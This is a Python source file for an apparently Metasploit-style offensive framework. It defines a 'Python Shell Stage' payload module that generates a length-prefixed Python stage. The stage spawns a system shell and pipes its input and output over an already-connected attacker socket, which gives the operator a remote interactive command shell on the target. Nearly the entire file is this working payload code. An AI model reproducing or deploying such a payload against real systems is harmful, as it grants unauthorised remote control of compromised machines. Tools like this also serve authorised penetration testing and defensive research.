import struct
from collections.abc import Sequence

from teralibs.tsf.base.payload import ARCH_PYTHON, PLATFORM_PYTHON, STAGE, Payload


class TerasploitModule(Payload):
    """Python interactive shell stage."""

    NAME: str = "Python Shell Stage"
    DESCRIPTION: str = "Spawn a python piped command shell"
    AUTHOR: Sequence = ["4steroth"]
    LICENSE: str = "BSD-3-CLAUSE"
    VERSION: str = "1.0"
    RANK: str = "normal"
    REFERENCES: Sequence = []
    PAYLOAD_TYPE: str = STAGE
    ARCH: Sequence = [ARCH_PYTHON]
    PLATFORM: Sequence = [PLATFORM_PYTHON]

    def generate_stage(self, ctx) -> bytes:
        """Return the Python shell stage bytes."""
        stage = [
            "import subprocess",
            "import selectors",
            "sock = msgsock",
            f"shell_path = '{ctx.get_option('SHELL')}'",
            "process = subprocess.Popen(",
            "    shell_path, stdin=subprocess.PIPE, stdout=subprocess.PIPE,",
            "    stderr=subprocess.PIPE, text=False, bufsize=0",
            ")",
            "sel = selectors.DefaultSelector()",
            "sel.register(sock, selectors.EVENT_READ)",
            "sel.register(process.stdout, selectors.EVENT_READ)",
            "sel.register(process.stderr, selectors.EVENT_READ)",
            "session_active = True",
            "try:",
            "    while session_active and process.poll() is None:",
            "        events = sel.select(timeout=0.1)",
            "        for key, _ in events:",
            "           if key.fileobj is sock:",
            "               data = sock.recv(1024)",
            "               if not data:",
            "                   session_active = False",
            "                   break",
            "               process.stdin.write(data)",
            "               process.stdin.flush()",
            "           elif key.fileobj in [process.stdout, process.stderr]:",
            "               output = key.fileobj.read(1024)",
            "               if output:",
            "                   sock.sendall(output)",
            "finally:",
            "    sel.close()",
            "    process.terminate()",
            "    process.wait()",
        ]

        # We join the stage here.
        stage = "\n".join(stage)

        # Encode the string into utf-8 and get the length prefix using struct.
        payload_bytes = stage.encode("utf-8")
        lenght_prefix = struct.pack(">I", len(payload_bytes))

        # Return the whole payload bytes with length prefix.
        return lenght_prefix + payload_bytes
